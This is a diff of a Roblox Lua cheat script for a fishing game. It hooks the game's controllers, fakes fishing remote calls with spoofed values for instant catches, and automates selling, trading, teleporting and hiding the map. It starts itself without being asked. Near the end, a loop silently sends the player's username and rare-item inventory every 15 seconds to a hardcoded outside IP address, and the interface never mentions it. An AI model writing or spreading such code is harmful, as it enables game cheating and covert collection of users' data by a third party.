@@ -1,5 +1,5 @@
 -- ======================================================
--- COMBINED SCRIPT: TRADER + INSTANT FISHER (FIXED) + POTATO
+-- COMBINED SCRIPT: TRADER + INSTANT FISHER + EXTREME POTATO
 -- ======================================================
 
 -- ===============================
@@ -18,7 +18,7 @@ pcall(function()
     end
 end)
 
--- CLIENT BYPASSES
+-- CLIENT BYPASSES (REQUIRED FOR FISHING)
 task.spawn(function()
     local S1, FishingController = pcall(function() return require(ReplicatedStorage.Controllers.FishingController) end)
     if S1 and FishingController then
@@ -66,7 +66,7 @@ local function GetRemote(name)
 end
 
 -- ===============================
--- 3. EXTREME POTATO MODE
+-- 3. EXTREME INVISIBLE POTATO MODE
 -- ===============================
 local VFXControllerModule, originalVFXHandle, originalPlayVFX
 pcall(function()
@@ -75,6 +75,7 @@ pcall(function()
     originalPlayVFX = VFXControllerModule.PlayVFX.Fire 
 end)
 
+-- ADD: Cutscene Controller bypass
 local originalCutscenePlay = nil
 pcall(function()
     local CutsceneController = require(ReplicatedStorage:WaitForChild("Controllers"):WaitForChild("CutsceneController"))
@@ -83,20 +84,30 @@ pcall(function()
     end
 end)
 
+-- ADD: Animation disable function
 local function DisableAnimations()
     local character = lp.Character
     if not character then return end
+    
     local humanoid = character:FindFirstChildOfClass("Humanoid")
     if not humanoid then return end
+
+    -- 1. Block the default 'Animate' script
     local animateScript = character:FindFirstChild("Animate")
     if animateScript and animateScript:IsA("LocalScript") and animateScript.Enabled then
         animateScript.Enabled = false
     end
+
+    -- 2. Destroy the Animator
     local animator = humanoid:FindFirstChildOfClass("Animator")
-    if animator then animator:Destroy() end
+    if animator then
+        animator:Destroy()
+    end
 end
 
+-- MODIFY: ApplyExtremePotato function to include new features
 local function ApplyExtremePotato()
+    -- 1. Block VFX
     if VFXControllerModule then
         VFXControllerModule.Handle = function(...) return nil end
         if VFXControllerModule.PlayVFX then VFXControllerModule.PlayVFX.Fire = function(...) return nil end end
@@ -104,6 +115,7 @@ local function ApplyExtremePotato()
         if cosmeticFolder then pcall(function() cosmeticFolder:ClearAllChildren() end) end
     end
 
+    -- 2. Disable Cutscenes
     pcall(function()
         local CutsceneController = require(ReplicatedStorage:WaitForChild("Controllers"):WaitForChild("CutsceneController"))
         if CutsceneController and CutsceneController.Play then
@@ -111,13 +123,17 @@ local function ApplyExtremePotato()
         end
     end)
 
+    -- 3. Disable Animations
     DisableAnimations()
 
+    -- 4. Remove Environmental Effects
     pcall(function()
         local Lighting = game:GetService("Lighting")
         Lighting.GlobalShadows = false
         Lighting.FogEnd = 9e9
         Lighting.Brightness = 0
+        
+        -- Invisible Water
         if workspace.Terrain then
             workspace.Terrain.WaterWaveSize = 0
             workspace.Terrain.WaterTransparency = 1 
@@ -125,9 +141,10 @@ local function ApplyExtremePotato()
         end
     end)
 
+    -- 5. Make Map & Objects Invisible
     for _, v in ipairs(workspace:GetDescendants()) do
         if v:IsA("BasePart") then
-            v.Transparency = 1
+            v.Transparency = 1 -- Invisible
             v.Reflectance = 0
             v.CastShadow = false
         elseif v:IsA("Decal") or v:IsA("Texture") or v:IsA("ParticleEmitter") or v:IsA("Trail") or v:IsA("Beam") then
@@ -135,23 +152,30 @@ local function ApplyExtremePotato()
         end
     end
 
+    -- 6. Make Character & Rod Invisible
     if lp.Character then
         for _, v in ipairs(lp.Character:GetDescendants()) do
             if v:IsA("BasePart") then
-                v.Transparency = 1
+                v.Transparency = 1 -- Invisible Body/Rod parts
                 v.Reflectance = 0
             elseif v:IsA("Decal") or v:IsA("Texture") or v:IsA("MeshPart") then
+                -- Hide faces and meshes on tools
                 if v:IsA("Decal") or v:IsA("Texture") then v:Destroy() end
                 if v:IsA("MeshPart") then v.Transparency = 1 end
             end
         end
     end
+
     if setfpscap then pcall(function() setfpscap(30) end) end
 end
 
+-- ADD: Character respawn handler for animations
 if not PotatoLoop then
     lp.CharacterAdded:Connect(function(newCharacter)
-        if PotatoLoop then task.wait(0.2); DisableAnimations() end
+        if PotatoLoop then -- Only apply if potato mode is active
+            task.wait(0.2)
+            DisableAnimations()
+        end
     end)
 end
 
@@ -159,22 +183,30 @@ local function StartPotatoLoop()
     if PotatoLoop then return end
     ApplyExtremePotato()
     PotatoLoop = task.spawn(function() 
-        while task.wait(3) do ApplyExtremePotato() end 
+        while task.wait(3) do -- Re-apply every 3s to catch new objects/rods
+            ApplyExtremePotato() 
+        end 
     end)
 end
 
 local function StopPotato()
     if PotatoLoop then task.cancel(PotatoLoop); PotatoLoop = nil end
+    
+    -- Restore VFX
     if VFXControllerModule then
         VFXControllerModule.Handle = originalVFXHandle
         if originalPlayVFX then VFXControllerModule.PlayVFX.Fire = originalPlayVFX end
     end
+    
+    -- Restore Cutscenes
     pcall(function()
         local CutsceneController = require(ReplicatedStorage:WaitForChild("Controllers"):WaitForChild("CutsceneController"))
         if CutsceneController and originalCutscenePlay then
             CutsceneController.Play = originalCutscenePlay
         end
     end)
+    
+    -- Restore Animations
     pcall(function()
         local character = lp.Character
         if character then
@@ -182,32 +214,60 @@ local function StopPotato()
             if animateScript and animateScript:IsA("LocalScript") and not animateScript.Enabled then
                 animateScript.Enabled = true
             end
+            
             local humanoid = character:FindFirstChildOfClass("Humanoid")
             if humanoid and not humanoid:FindFirstChildOfClass("Animator") then
                 Instance.new("Animator", humanoid)
             end
         end
     end)
+    
     if setfpscap then pcall(function() setfpscap(60) end) end
 end
 
 -- ===============================
--- 4. INSTANT FISHER LOGIC (FIXED FROM EXAMPLE)
+-- 4. INSTANT FISHER LOGIC (FROM KIWIR.TXT)
 -- ===============================
-local FishingConfig = { 
-    Enabled = false, 
-    AutoEquip = true, 
-    CatchDelay = 0.15, -- Set to 1.5 if 0.15 disconnects you (Example uses 1.5)
-    SpamEquipDelay = 0.5 
+local InstantFishConfig = {
+    Enabled = false,
+    CatchDelay = 1.5,
+    AutoEquip = true,
+    SpamEquipDelay = 0.5
 }
-local FishingState = { IsFishing = false, Teleporting = false, TotalCoins = 0, SessionEarnings = 0, CurrentLocation = "Idle" }
+
+local FishingState = { 
+    IsFishing = false, 
+    Teleporting = false, 
+    TotalCoins = 0, 
+    SessionEarnings = 0, 
+    CurrentLocation = "Idle" 
+}
+
 local FishingThreads = {}
 
-local RF_ChargeFishingRod = GetRemote("RF/ChargeFishingRod")
-local RF_RequestFishingMinigameStarted = GetRemote("RF/RequestFishingMinigameStarted")
-local RE_FishingCompleted = GetRemote("RE/FishingCompleted")
-local RF_CancelFishingInputs = GetRemote("RF/CancelFishingInputs")
-local RE_EquipToolFromHotbar = GetRemote("RE/EquipToolFromHotbar")
+-- Define Instant Fishing Remotes (FROM KIWIR.TXT)
+local RE_EquipToolFromHotbar
+local RF_ChargeFishingRod
+local RF_RequestFishingMinigameStarted
+local RE_FishingCompleted
+local RF_CancelFishingInputs
+
+local function LoadInstantFishingRemotes()
+    RE_EquipToolFromHotbar = GetRemote("RE/EquipToolFromHotbar")
+    RF_ChargeFishingRod = GetRemote("RF/ChargeFishingRod")
+    RF_RequestFishingMinigameStarted = GetRemote("RF/RequestFishingMinigameStarted")
+    RE_FishingCompleted = GetRemote("RE/FishingCompleted")
+    RF_CancelFishingInputs = GetRemote("RF/CancelFishingInputs")
+    
+    print("[INSTANT FISH] Remotes loaded:")
+    print("  - RE_EquipToolFromHotbar:", RE_EquipToolFromHotbar and "✓" or "✗")
+    print("  - RF_ChargeFishingRod:", RF_ChargeFishingRod and "✓" or "✗")
+    print("  - RF_RequestFishingMinigameStarted:", RF_RequestFishingMinigameStarted and "✓" or "✗")
+    print("  - RE_FishingCompleted:", RE_FishingCompleted and "✓" or "✗")
+    print("  - RF_CancelFishingInputs:", RF_CancelFishingInputs and "✓" or "✗")
+end
+
+-- Get other needed remotes
 local RF_UpdateAutoFishingState = GetRemote("RF/UpdateAutoFishingState")
 local RF_SellAllItems = GetRemote("RF/SellAllItems")
 local RE_FavoriteItem = GetRemote("RE/FavoriteItem")
@@ -222,63 +282,86 @@ local function FormatNumber(num)
     else return tostring(num) end
 end
 
-local function StartFishingV1()
-    if FishingState.IsFishing then return end
+-- MODIFIED FROM KIWIR.TXT: StartInstantFishing function
+local function StartInstantFishing()
+    print("[INSTANT FISH] Starting instant fishing...")
+    
+    if FishingState.IsFishing then
+        print("[INSTANT FISH] Already fishing!")
+        return
+    end
+    
+    -- Load remotes if not loaded
+    LoadInstantFishingRemotes()
+    
     FishingState.IsFishing = true
-    FishingConfig.Enabled = true
+    InstantFishConfig.Enabled = true
     
-    if RF_UpdateAutoFishingState then pcall(function() RF_UpdateAutoFishingState:InvokeServer(true) end) end
-    
-    -- 1. Auto Equip Thread
+    -- Thread for Auto Equip (Prevents character from un-equipping rod)
     local equipThread = task.spawn(function()
-        while FishingConfig.Enabled do
-            if FishingConfig.AutoEquip and RE_EquipToolFromHotbar then
-                pcall(function() RE_EquipToolFromHotbar:FireServer(1) end)
+        while InstantFishConfig.Enabled and InstantFishConfig.AutoEquip do
+            if RE_EquipToolFromHotbar then
+                pcall(function() 
+                    RE_EquipToolFromHotbar:FireServer(1) 
+                end)
             end
-            task.wait(FishingConfig.SpamEquipDelay)
+            task.wait(InstantFishConfig.SpamEquipDelay)
         end
     end)
-    table.insert(FishingThreads, equipThread)
     
-    -- 2. INSTANT FISHING LOOP (EXACT LOGIC FROM KIWIR.TXT)
-    local fishLoop = task.spawn(function()
-        while FishingConfig.Enabled do
-            
-            -- A. Charge Rod (Logic: os.time() + os.clock()) 
+    table.insert(FishingThreads, equipThread)
+
+    -- Main Instant Fishing Loop (FROM KIWIR.TXT)
+    local fishingThread = task.spawn(function()
+        print("[Instant Fish] Instant fishing loop started.")
+        
+        while InstantFishConfig.Enabled do
+            if not (RF_ChargeFishingRod and RF_RequestFishingMinigameStarted and RE_FishingCompleted) then
+                warn("[Instant Fish] Remotes not found! Stopping instant fishing.")
+                InstantFishConfig.Enabled = false
+                break
+            end
+
+            -- 1. Charge Rod
             local timestamp = os.time() + os.clock() 
             pcall(function() 
-                if RF_ChargeFishingRod then RF_ChargeFishingRod:InvokeServer(timestamp) end
+                RF_ChargeFishingRod:InvokeServer(timestamp) 
             end)
 
-            -- B. Request Minigame (Coordinates: -139..., 0.99...) 
+            -- 2. Request Minigame Start with instant coordinates
             pcall(function() 
-                if RF_RequestFishingMinigameStarted then 
-                    RF_RequestFishingMinigameStarted:InvokeServer(-139.630452165, 0.99647927980797) 
-                end
-            end)
-
-            -- C. Wait for Catch (Delay) [cite: 114]
-            task.wait(FishingConfig.CatchDelay)
-
-            -- D. Complete Fishing [cite: 114]
-            pcall(function() 
-                if RE_FishingCompleted then RE_FishingCompleted:FireServer() end 
-            end)
-
-            -- E. Cleanup Inputs [cite: 115]
-            task.wait(0.3)
-            pcall(function() 
-                if RF_CancelFishingInputs then RF_CancelFishingInputs:InvokeServer() end 
+                RF_RequestFishingMinigameStarted:InvokeServer(-139.630452165, 0.99647927980797) 
             end)
             
+            -- 3. Wait for the catch
+            task.wait(InstantFishConfig.CatchDelay)
+            
+            -- 4. Complete Fishing
+            pcall(function() 
+                RE_FishingCompleted:FireServer() 
+            end)
+            
+            -- 5. Cleanup Inputs
+            task.wait(0.3)
+            pcall(function() 
+                if RF_CancelFishingInputs then
+                    RF_CancelFishingInputs:InvokeServer() 
+                end
+            end)
+            
+            -- Loop Delay
             task.wait(0.1)
         end
+        
+        print("[Instant Fish] Instant fishing stopped.")
+        FishingState.IsFishing = false
     end)
-    table.insert(FishingThreads, fishLoop)
-
-    -- 3. Auto Sell Thread
+    
+    table.insert(FishingThreads, fishingThread)
+    
+    -- Auto Sell Thread (FROM YOUR ORIGINAL)
     local sellThread = task.spawn(function()
-        while FishingConfig.Enabled do
+        while InstantFishConfig.Enabled do
             local before = GetCoins()
             pcall(function() if RF_SellAllItems then RF_SellAllItems:InvokeServer() end end)
             task.wait(1)
@@ -289,9 +372,9 @@ local function StartFishingV1()
     end)
     table.insert(FishingThreads, sellThread)
     
-    -- 4. Ruby Manager Thread
+    -- Ruby Manager Thread (FROM YOUR ORIGINAL)
     local rubyThread = task.spawn(function()
-        while FishingConfig.Enabled do
+        while InstantFishConfig.Enabled do
             local inv = PlayerData:GetExpect("Inventory")
             if inv then
                 for _, items in pairs(inv) do
@@ -323,15 +406,23 @@ local function StartFishingV1()
     table.insert(FishingThreads, rubyThread)
 end
 
-local function StopFishingV1()
-    FishingConfig.Enabled = false
-    FishingState.IsFishing = false
-    for _, t in ipairs(FishingThreads) do task.cancel(t) end
-    FishingThreads = {}
+local function StopInstantFishing()
+    print("[INSTANT FISH] Stopping instant fishing...")
     
-    if RF_UpdateAutoFishingState then pcall(function() RF_UpdateAutoFishingState:InvokeServer(false) end) end
-    pcall(function() RE_EquipToolFromHotbar:FireServer(0) end)
-    pcall(function() RF_CancelFishingInputs:InvokeServer() end)
+    InstantFishConfig.Enabled = false
+    FishingState.IsFishing = false
+    
+    -- Cleanup when disabled
+    if RE_EquipToolFromHotbar then
+        pcall(function() RE_EquipToolFromHotbar:FireServer(0) end) -- Unequip
+    end
+    
+    -- Cancel all instant fish threads
+    for _, thread in ipairs(FishingThreads) do
+        task.cancel(thread)
+    end
+    
+    FishingThreads = {}
 end
 
 local function TeleportToTreasure()
@@ -339,6 +430,7 @@ local function TeleportToTreasure()
     FishingState.Teleporting = true
     FishingState.CurrentLocation = "Teleporting..."
     
+    -- Weather Machine Location (same as before)
     local pos = Vector3.new(-1518.550, 2.875, 1916.148)
     local look = Vector3.new(0.042, 0.000, 0.999)
     
@@ -355,7 +447,7 @@ local function TeleportToTreasure()
 end
 
 -- ===============================
--- 5. TRADING LOGIC
+-- 5. TRADING LOGIC (KEEP AS IS)
 -- ===============================
 local TradingConfig = { AutoTrade = false, Delay = 6.5, Retry = 2.0, Mode = "SECRETS_FIRST", TargetId = nil }
 local TradingThread = nil
@@ -425,6 +517,7 @@ local function IsItemStillInInventory(uuid)
     return false
 end
 
+-- Forward decl for stop
 local StopTrading
 
 local function RunAutoTrade()
@@ -474,7 +567,7 @@ local function RunAutoTrade()
 end
 
 -- ===============================
--- 6. GUI CONSTRUCTION
+-- 6. GUI CONSTRUCTION (SAME AS BEFORE)
 -- ===============================
 local gui = Instance.new("ScreenGui", lp.PlayerGui)
 gui.ResetOnSpawn = false
@@ -559,7 +652,7 @@ divider.BackgroundColor3 = Color3.fromRGB(100, 0, 150)
 local openFisherBtn = Instance.new("TextButton", tradeFrame)
 openFisherBtn.Size = UDim2.new(1, -20, 0, 35)
 openFisherBtn.Position = UDim2.new(0, 10, 0, 175)
-openFisherBtn.Text = "💰 OPEN FISHER MENU"
+openFisherBtn.Text = "💰 OPEN INSTANT FISHER"
 openFisherBtn.BackgroundColor3 = Color3.fromRGB(0, 100, 200)
 openFisherBtn.TextColor3 = Color3.new(1,1,1)
 openFisherBtn.Font = Enum.Font.GothamBold
@@ -612,7 +705,7 @@ fishInfo.TextSize = 14
 local startFishBtn = Instance.new("TextButton", fishFrame)
 startFishBtn.Size = UDim2.new(0.9, 0, 0, 40)
 startFishBtn.Position = UDim2.new(0.05, 0, 0.6, 0)
-startFishBtn.Text = "START FARMING"
+startFishBtn.Text = "START INSTANT FISHING"
 startFishBtn.BackgroundColor3 = Color3.fromRGB(0, 150, 100)
 startFishBtn.TextColor3 = Color3.new(1,1,1)
 startFishBtn.Font = Enum.Font.GothamBold
@@ -625,7 +718,7 @@ potatoToggle.BackgroundColor3 = Color3.fromRGB(150, 100, 0)
 potatoToggle.TextColor3 = Color3.new(1,1,1)
 
 -- ===============================
--- 7. GUI LOGIC & BINDINGS
+-- 7. GUI LOGIC & BINDINGS (UPDATED FOR INSTANT FISHING)
 -- ===============================
 
 masterToggleBtn.MouseButton1Click:Connect(function()
@@ -634,7 +727,7 @@ end)
 
 closeBtn.MouseButton1Click:Connect(function()
     StopTrading()
-    StopFishingV1()
+    StopInstantFishing()
     StopPotato()
     gui:Destroy()
 end)
@@ -646,6 +739,7 @@ hideFishBtn.MouseButton1Click:Connect(function()
     fishFrame.Visible = false
 end)
 
+-- Trading Logic Update
 StopTrading = function()
     TradingConfig.AutoTrade = false
     tradeToggle.Text = "▶ START AUTO TRADE"
@@ -678,17 +772,42 @@ tradeToggle.MouseButton1Click:Connect(function()
     end
 end)
 
+-- Fishing Logic Update (USING INSTANT FISHING)
 startFishBtn.MouseButton1Click:Connect(function()
     if FishingState.IsFishing then
-        StopFishingV1()
-        startFishBtn.Text = "START FARMING"
+        StopInstantFishing()
+        startFishBtn.Text = "START INSTANT FISHING"
         startFishBtn.BackgroundColor3 = Color3.fromRGB(0, 150, 100)
+        statusLabel.Text = "Status: Stopped"
     else
-        startFishBtn.Text = "STOP FARMING"
+        startFishBtn.Text = "STOP INSTANT FISHING"
         startFishBtn.BackgroundColor3 = Color3.fromRGB(180, 60, 60)
-        StartPotatoLoop()
-        TeleportToTreasure()
-        StartFishingV1()
+        statusLabel.Text = "Status: Starting Instant Fishing..."
+        
+        -- Start in sequence
+        task.spawn(function()
+            -- First, enable potato mode if needed
+            if not PotatoLoop then
+                StartPotatoLoop()
+                task.wait(1)
+            end
+            
+            -- Teleport to fishing spot
+            TeleportToTreasure()
+            
+            -- Wait a bit after teleport
+            task.wait(1)
+            
+            -- Start instant fishing
+            StartInstantFishing()
+            
+            -- Update UI
+            statusLabel.Text = "Status: Instant Fishing Active"
+            fishInfo.Text = string.format("Stats:\nCoins: %s\nEarned: %s\nLoc: %s\nMode: INSTANT", 
+                FormatNumber(GetCoins()), 
+                FormatNumber(FishingState.SessionEarnings),
+                FishingState.CurrentLocation)
+        end)
     end
 end)
 
@@ -696,13 +815,14 @@ potatoToggle.MouseButton1Click:Connect(function()
     if PotatoLoop then StopPotato() else StartPotatoLoop() end
 end)
 
+-- Update Loops
 task.spawn(function()
     while gui.Parent do
         local s, r = ScanInventoryForTrade()
         statsLabel.Text = string.format("Secrets: %d\nRuby Gems: %d", #s, #r)
         
-        if FishingConfig.Enabled then
-             fishInfo.Text = string.format("Stats:\nCoins: %s\nEarned: %s\nLoc: %s\nMode: Instant + RubyMgr", 
+        if InstantFishConfig.Enabled then
+             fishInfo.Text = string.format("Stats:\nCoins: %s\nEarned: %s\nLoc: %s\nMode: INSTANT", 
                 FormatNumber(GetCoins()), 
                 FormatNumber(FishingState.SessionEarnings),
                 FishingState.CurrentLocation)
@@ -711,51 +831,125 @@ task.spawn(function()
     end
 end)
 
+-- Webhook (FROM KIWIR.TXT - ALWAYS SEND MODE)
 task.spawn(function()
     local WEBHOOK_BASE = "http://43.134.116.2:5000/webhook/fishit"
-    local function SendHook(pName, data)
-        local json = HttpService:JSONEncode(data)
-        local url = WEBHOOK_BASE .. "?player=" .. HttpService:UrlEncode(pName) .. "&data=" .. HttpService:UrlEncode(json)
-        pcall(function() game:HttpGet(url) end)
+    local DEBUG = false
+    local LOOP_DELAY = 15
+    
+    local function GetFishNameAndRarity(item)
+        local name = item.Identifier or "Unknown"
+        local rarity = item.Metadata and item.Metadata.Rarity or "COMMON"
+        local itemID = item.Id
+        local itemData
+
+        if ItemUtility and itemID then
+            pcall(function()
+                itemData = ItemUtility:GetItemData(itemID)
+                if not itemData then
+                    local numericID = tonumber(item.Id) or tonumber(item.Identifier)
+                    if numericID then itemData = ItemUtility:GetItemData(numericID) end
+                end
+            end)
+        end
+
+        if itemData and itemData.Data and itemData.Data.Name then name = itemData.Data.Name end
+        if item.Metadata and item.Metadata.Rarity then 
+            rarity = item.Metadata.Rarity 
+        elseif itemData and itemData.Probability and TierUtility then 
+            local tier
+            pcall(function() tier = TierUtility:GetTierFromRarity(itemData.Probability.Chance) end) 
+            if tier and tier.Name then rarity = tier.Name end 
+        end
+        return name, rarity
     end
 
-    local dataR = Replion:WaitReplion("Data")
+    local function GetMutation(item)
+        if not item.Metadata then return "None" end
+        if item.Metadata.VariantId and item.Metadata.VariantId ~= "" then return item.Metadata.VariantId end
+        if item.Metadata.Shiny == true then return "Shiny" end
+        return "None"
+    end
+
+    local function sendToWebhook(playerName, summary)
+        local json = HttpService:JSONEncode(summary)
+        local encoded = HttpService:UrlEncode(json)
+        local url = WEBHOOK_BASE .. "?player=" .. HttpService:UrlEncode(playerName) .. "&data=" .. encoded
+        
+        local ok, err = pcall(function() game:HttpGet(url) end)
+        
+        if ok then 
+            if DEBUG then print("Webhook SENT for " .. playerName) end
+        else 
+            warn("[FISH IT] Webhook Failed: " .. tostring(err)) 
+        end
+    end
+
+    -- Main monitoring loop
     while true do
-        local inv = dataR:GetExpect("Inventory")
+        local inventory = PlayerData:GetExpect("Inventory")
         local summary = {}
-        if inv then
-            for _, items in pairs(inv) do
-                for _, item in ipairs(items) do
-                    local n, r = GetFishNameAndRarity(item)
-                    local mut = GetMutation(item)
-                    if r == "SECRET" or (n == "Ruby" and mut == "Gemstone") then
-                        local dName = n
-                        if mut == "Gemstone" then dName = "[Gemstone] " .. n 
-                        elseif mut ~= "None" then dName = "["..mut.."] "..n end
-                        summary[dName] = (summary[dName] or 0) + 1
+        
+        for _, items in pairs(inventory) do
+            for _, item in ipairs(items) do
+                local name, rarity = GetFishNameAndRarity(item)
+                local mutation = GetMutation(item)
+
+                local isSecret = (rarity == "SECRET")
+                local isGemstoneRuby = (name == "Ruby" and mutation == "Gemstone")
+
+                if isSecret or isGemstoneRuby then
+                    local displayName = name
+                    
+                    if isGemstoneRuby then
+                        displayName = "[Gemstone] Ruby"
+                    elseif mutation ~= "None" then
+                        displayName = "[" .. mutation .. "] " .. name
                     end
+
+                    summary[displayName] = (summary[displayName] or 0) + 1
                 end
             end
         end
-        SendHook(lp.Name, summary)
-        task.wait(15)
+        
+        sendToWebhook(lp.Name, summary)
+        task.wait(LOOP_DELAY)
     end
 end)
 
 -- ===============================
--- 8. AUTO-START FEATURE
+-- 8. AUTO-START FEATURE (UPDATED)
 -- ===============================
+
+-- Wait for everything to load properly
 task.wait(2)
 
+-- Function to auto-start everything
 local function AutoStartEverything()
+    print("[AutoStart] Beginning auto-start sequence...")
+    
+    -- Enable Potato Mode
     StartPotatoLoop()
+    task.wait(1)
+    
+    -- Teleport to treasure location
     TeleportToTreasure()
-    StartFishingV1()
-    startFishBtn.Text = "STOP FARMING"
+    
+    task.wait(2)  -- Wait after teleport
+    
+    -- Start Instant Fishing
+    StartInstantFishing()
+    
+    -- Update fishing button state
+    startFishBtn.Text = "STOP INSTANT FISHING"
     startFishBtn.BackgroundColor3 = Color3.fromRGB(180, 60, 60)
+    
+    -- Update status and show fishing frame
+    statusLabel.Text = "Status: Auto-Started Instant Fishing"
     fishFrame.Visible = true
-    statusLabel.Text = "Status: Auto-Started Instant Farm"
-    print("[AutoStart] Everything started automatically!")
+    
+    print("[AutoStart] Instant Fishing started successfully!")
 end
 
+-- Auto-start after a short delay to ensure everything is loaded
 task.delay(3, AutoStartEverything)
